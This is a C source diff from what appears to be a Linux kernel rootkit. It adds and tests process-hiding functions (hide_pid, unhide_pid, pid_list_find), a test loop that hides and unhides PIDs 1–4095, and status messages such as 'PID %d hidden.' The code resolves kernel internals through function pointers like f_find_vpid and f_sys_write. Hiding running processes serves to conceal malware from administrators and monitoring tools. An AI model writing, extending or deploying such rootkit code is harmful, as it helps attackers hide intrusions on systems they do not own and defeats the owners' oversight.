@@ -106,6 +106,7 @@ void pid_list_create(void);
 void pid_list_destroy(void);
 void pid_list_push(pid_t nr);
 pid_t pid_list_pop(pid_t nr);
+struct pid_list_node *pid_list_find(pid_t nr);
 //void *readfile(const char *file, size_t *len);
 
 /*
@@ -128,20 +129,39 @@ extern tf_sys_write *f_sys_write(void);
  */
 extern struct pid_list_node **pid_list_head(void);
 extern struct pid_list_node **pid_list_tail(void);
-extern const char *MSG_OK(void);
+extern const char *MSG_PID_UHD(void);
+extern const char *MSG_PID_AHD(void);
+extern const char *MSG_PID_HD(void);
 extern const char *MSG_PID_NF(void);
 extern const char *MSG_PID_NH(void);
 extern const char *MSG_KM_ERR(void);
 
 void kernel_test(void) {
+	size_t i;
 
-	pinfo(MSG_OK());
-    //pid_list_create();
+    /*
+	 * Testing pid_list
+	 */
+	pid_list_create();
 
-    //hide_pid(3924);
-    //hide_pid(3925);
+	for (i = 1; i < 4096; i++) {
+		hide_pid(i);
+		unhide_pid(i);
+	}
 
-	//pid_list_destroy();
+	for(i = 1; i < 4096; i++) {
+		hide_pid(i);
+	}
+
+	for (i = 1; i < 4096; i++) {
+		unhide_pid(i);
+	}
+
+	for (i = 1; i < 4096; i++) {
+		hide_pid(i);
+	}
+
+	pid_list_destroy();
 }
 
 int hide_pid(pid_t nr) {
@@ -149,12 +169,15 @@ int hide_pid(pid_t nr) {
 	
 	pid = (*f_find_vpid())(nr);
 	if (pid) {
-		pid_list_push(nr);
-		pinfo(MSG_OK());
-
-		return 0;
+		if (pid_list_find(nr)) {
+			perr(MSG_PID_AHD(), nr);
+		} else {
+			pid_list_push(nr);
+			pinfo(MSG_PID_HD(), nr);
+			return 0;
+		}
 	} else {
-		perr(MSG_PID_NF());
+		perr(MSG_PID_NF(), nr);
 	}
 
 	return -1;
@@ -162,11 +185,11 @@ int hide_pid(pid_t nr) {
 
 int unhide_pid(pid_t nr) {
 	if (pid_list_pop(nr) == nr) {
-		pinfo(MSG_OK());
+		pinfo(MSG_PID_UHD(), nr);
 
 		return 0;
 	} else {
-		perr(MSG_PID_NH());
+		perr(MSG_PID_NH(), nr);
 	}
 	
 	return -1;
@@ -184,6 +207,20 @@ void pid_list_push(pid_t nr) {
 	} else {
 		perr(MSG_KM_ERR(), __LINE__);
 	}
+}
+
+struct pid_list_node *pid_list_find(pid_t nr) {
+	struct pid_list_node *node;
+
+	node = *pid_list_head();
+	while(node) {
+        if (node->nr == nr) {
+			return node;
+		}
+		node = node->next;
+	}
+
+	return NULL;
 }
 
 pid_t pid_list_pop(pid_t nr) {
@@ -221,6 +258,8 @@ void pid_list_destroy() {
 	while((*pid_list_head())->next) {
 		unhide_pid((*pid_list_tail())->nr);
 	}
+
+	(*f_kfree())(*pid_list_head());
 }
 
 /*
@@ -310,9 +349,11 @@ DPTR(f_sys_write)
 /*
  * Strings.
  */
-DSTR(MSG_OK, "Ok\n")
-DSTR(MSG_PID_NF, "PID not found.\n")
-DSTR(MSG_PID_NH, "PID is not hidden.\n")
+DSTR(MSG_PID_UHD, "PID %d unhidden.\n")
+DSTR(MSG_PID_AHD, "PID %d already hidden.\n")
+DSTR(MSG_PID_HD, "PID %d hidden.\n")
+DSTR(MSG_PID_NF, "PID %d not found.\n")
+DSTR(MSG_PID_NH, "PID %d is not hidden.\n")
 DSTR(MSG_KM_ERR, "f_kmalloc error, line %d.\n")
 
 /*
